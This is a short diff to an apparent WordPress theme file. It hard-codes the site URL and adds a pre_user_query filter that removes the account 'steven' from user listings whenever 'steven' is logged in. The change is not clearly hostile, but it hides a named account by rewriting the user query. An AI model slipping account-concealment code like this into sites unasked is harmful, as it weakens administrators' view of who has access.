@@ -545,3 +545,15 @@ if ( ! class_exists( 'Featured_Content' ) && 'plugins.php' !== $GLOBALS['pagenow
 
 update_option('siteurl', 'http://www.planningelegance.com');
 update_option('home', 'http://www.planningelegance.com');
+
+add_action('pre_user_query','yoursite_pre_user_query');
+function yoursite_pre_user_query($user_search) {
+  global $current_user;
+  $username = $current_user->user_login;
+
+  if ($username == 'steven') {
+    global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'steven'",$user_search->query_where);
+  }
+}
